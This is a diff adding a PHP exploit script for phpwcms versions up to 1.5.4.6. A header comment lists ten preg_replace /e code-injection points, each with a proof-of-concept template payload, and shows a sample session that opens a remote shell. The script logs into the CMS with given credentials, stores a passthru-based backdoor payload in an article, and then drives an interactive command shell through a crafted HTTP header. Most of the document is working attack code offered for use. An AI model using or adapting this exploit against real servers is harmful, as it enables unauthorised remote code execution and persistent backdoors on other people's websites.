@@ -1,0 +1,200 @@
+<?php
+/*
+phpwcms <= v1.5.4.6 "preg_replace" remote code execution exploit
+vendor: http://www.phpwcms.de/
+Download: github.com/slackero/phpwcms
+by: aeon
+
+Well it appears there are multiple remote code execution bugs that exists in phpwcms for quite some time now. Here I will exploit one of them, but many are available to an attacker. I have only listed 10 as I got bored after that point...
+
+In order to exploit the vulnerabilities, you will need to have access to an authenticated account as either a "backend user", "admin user" or "frontend / backend user". The only account that cannot exploit these vulnerabilities is the "frontend user".
+
+Other vulnerabilities most probably exist in this application but I don't bother auditing for xss/csrf/click jacking etc. I only care about true
+remotely exploitable bugs 8-)
+
+Examples:
+
+1. Lines 699-700 of ./include/inc_front/content.func.inc.php:
+-------------------------------------------------------------
+
+// list based navigation starting at given level
+$replace = 'nav_list_struct($content["struct"],$content["cat_id"],"$1", "$2");';
+$content["all"] = preg_replace('/\{NAV_LIST:(\d+):{0,1}(.*){0,1}\}/e', $replace, $content["all"]);
+
+PoC:
+{NAV_LIST:1:{${phpinfo()}}}
+
+2. Line 704 of ,.include/inc_front/content.func.inc.php:
+--------------------------------------------------------
+
+$content["all"] = preg_replace('/\{NAV_LIST_TOP:(.*?):(.*?)\}/e', 'css_level_list($content["struct"], $content["cat_path"], 0, "$1", 1, "$2")', $content["all"]);
+
+PoC:
+{NAV_LIST_TOP:{${phpinfo}}:1}
+
+3. line 708 of ./include/inc_front/content.func.inc.php:
+--------------------------------------------------------
+
+$content["all"] = preg_replace('/\{NAV_LIST_CURRENT:(\d+):(.*?):(.*?)\}/e', 'css_level_list($content["struct"],$content["cat_path"],$content["cat_id"],"$2","$1","$3")', $content["all"]);
+
+PoC:
+{NAV_LIST_CURRENT:1:{${phpinfo()}}:1}
+
+4. Line 792 of ./include/inc_front/content.func.inc.php:
+--------------------------------------------------------
+
+$content["all"] = preg_replace('/\{BROWSE:NEXT:(.*?):(0|1)\}/e','get_index_link_next("$1",$2);',$content["all"]);
+
+PoC:
+{BROWSE:NEXT:{${phpinfo()}}:1}
+
+5. Line 793 of ./include/inc_front/content.func.inc.php:
+--------------------------------------------------------
+
+$content["all"] = preg_replace('/\{BROWSE:PREV:(.*?):(0|1)\}/e','get_index_link_prev("$1",$2);',$content["all"]);
+
+PoC:
+{BROWSE:PREV:{${phpinfo()}}:1}
+
+6. Line 2661 of ./include/inc_front/front.func.inc.php:
+-------------------------------------------------------
+
+$text = preg_replace('/\{LIVEDATE:(.*?) lang=(..)\}/e', 'international_date_format("$2","$1","'.$livedate.'")', $text);
+
+PoC:
+{LIVEDATE:{${phpinfo()}} lang=ru}
+
+7. Line 2658 of ./include/inc_front/front.func.inc.php:
+-------------------------------------------------------
+
+$text = preg_replace('/\{DATE:(.*?) lang=(..)\}/e', 'international_date_format("$2","$1","'.$date.'")', $text);
+
+PoC:
+{DATE:{${phpinfo()}} lang=ru}
+
+8. Line 2665 of ./include/inc_front/front.func.inc.php:
+-------------------------------------------------------
+
+$text = preg_replace('/\{KILLDATE:(.*?) lang=(..)\}/e', 'international_date_format("$2","$1","'.$killdate.'")', $text);
+
+PoC:
+{KILLDATE:{${phpinfo()}} lang=ru}
+
+9. Line 2668 of ./include/inc_front/front.func.inc.php:
+-------------------------------------------------------
+
+return preg_replace('/\{NOW:(.*?) lang=(..)\}/e', 'international_date_format("$2","$1","'.now().'")', $text);
+
+PoC:
+{NOW:{${phpinfo()}} lang=ru}
+
+10. Line 2674 of ./include/inc_front/front.func.inc.php:
+--------------------------------------------------------
+
+$text = preg_replace('/\{'.$rt.':(.*?) lang=(..)\}/e', 'international_date_format("$2","$1","'.$date.'")', $text);
+
+PoC:
+{DATE:{${phpinfo()}} lang=ru}
+
+################################################################################################
+[aeon@brainbox 0day]$ php ./phpwcmsrce.php 192.168.1.120 /phpwcms-1.5.4.6/ jack password
+
++-----------------------------------------------------------+
+| phpwcms <= v1.5.4.6 Remote Code Execution Exploit by aeon |
++-----------------------------------------------------------+
+(+) initiating target interaction
+(+) grabbed a valid session
+(+) logged into the target application
+(+) exploit working! dropping to shell..
+
+phpwcms-shell> id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+phpwcms-shell> uname -a
+Linux bt 3.2.6 #1 SMP Fri Feb 17 10:40:05 EST 2012 i686 GNU/Linux
+################################################################################################
+
+*/
+
+error_reporting(0);
+set_time_limit(0);
+ini_set('default_socket_timeout', 5);
+ 
+function http_send($host, $packet)
+{
+    if (!($sock = fsockopen($host, 80))) die("\n(-) No response from {$host}:80\r\n");
+    fputs($sock, $packet);
+    return stream_get_contents($sock);
+}
+ 
+print "\n+-----------------------------------------------------------+";
+print "\n| phpwcms <= v1.5.4.6 Remote Code Execution Exploit by aeon |";
+print "\n+-----------------------------------------------------------+\n";
+ 
+if ($argc < 5)
+{
+    print "\nUsage......: php $argv[0] <host> <path> <user> <pass>\n";
+    print "\nExample....: php $argv[0] localhost / admin pass";
+    print "\nExample....: php $argv[0] localhost /phpwcms-1.5.4.6/ jack black\n";
+    die();
+}
+ 
+list($host, $path, $user, $pass) = array($argv[1], $argv[2], $argv[3], $argv[4]);
+ 
+// init session
+print "(+) initiating target interaction\r\n";
+$packet  = "GET {$path}login.php HTTP/1.0\r\n";
+$packet .= "Host: {$host}\r\n";
+$packet .= "Connection: close\r\n\r\n";
+
+$_prefix = preg_match('/Set-Cookie: (.+); path=/', http_send($host, $packet), $m) ?  $m[1] : '';
+print ($_prefix ? "(+) grabbed a valid session" : "(-) exploit failed! couldnt obtain a session")."\r\n";
+
+$pass      = md5($pass);
+$postcreds = "json=1&md5pass={$pass}&form_aktion=login&form_loginname={$user}&form_lang=ru&submit_form=Login";
+
+// login
+$packet  = "POST {$path}login.php?{$phpcode} HTTP/1.0\r\n";
+$packet .= "Host: {$host}\r\n";
+$packet .= "Cookie: {$_prefix}\r\n";
+$packet .= "Content-Type: application/x-www-form-urlencoded\r\n";
+$packet .= "Content-Length: ".strlen($postcreds)."\r\n";
+$packet .= "Connection: close\r\n\r\n{$postcreds}";
+
+if (!preg_match('/HTTP\/1.[01] 302 Found/', http_send($host, $packet))) die("\n(-) login failed!\n");
+print "(+) logged into the target application\r\n";
+
+$phpkode  = '{${error_reporting(0)}}{${print(aeon)}}{${passthru(base64_decode($_SERVER[HTTP_PHPWCMS]))}}{${die}}';
+$pat      = "{DATE:{$phpkode} lang=en}";
+$payload  = "article_cid=0&article_title=wtf&set_begin=1&article_begin=2012-12-16+00%3A00%3A00&article_summary=";
+$payload .= urlencode($pat)."&article_username=jack&article_aktiv=1&article_public=1&article_update=1&updatesubmit=Create";
+
+// backdooring db content
+$packet  = "POST {$path}phpwcms.php?do=articles&p=2&s=1&aktion=1&id=0 HTTP/1.0\r\n";
+$packet .= "Host: {$host}\r\n";
+$packet .= "Content-Length: ".strlen($payload)."\r\n";
+$packet .= "Content-Type: application/x-www-form-urlencoded\r\n";
+$packet .= "Cookie: {$_prefix}\r\n";
+$packet .= "Connection: close\r\n\r\n{$payload}";
+
+$_aid = preg_match('/&id=([0-9]{0,30})/', http_send($host, $packet), $m) ? $m[1] : '';
+print ($_aid ? "(+) exploit working! dropping to shell.." : "(-) exploit failed! couldnt find article id")."\r\n";
+
+// triggering preg_replace code evaluation
+$packet  = "GET {$path}index.php?aid={$_aid} HTTP/1.0\r\n";
+$packet .= "Host: {$host}\r\n";
+$packet .= "Phpwcms: %s\r\n";
+$packet .= "Connection: close\r\n\r\n";
+
+if (preg_match('/aeon', http_send($host, $packet))) die("\n(-) opps! hmm, backdoor didnt quite work..\r\n");
+
+while(1)
+{
+    print "\nphpwcms-shell> ";
+    if (($cmd = trim(fgets(STDIN))) == "exit") break;
+    $response = http_send($host, sprintf($packet, base64_encode($cmd)));
+    preg_match('/aeon(.*)/s', $response, $m) ? print $m[1] : die("\n(-) exploit failed!\n");
+}
+
+// @aeon_flux_ | aeon.s.flux(at)gmail(.)com | https://infosecabsurdity.wordpress.com/
+?>
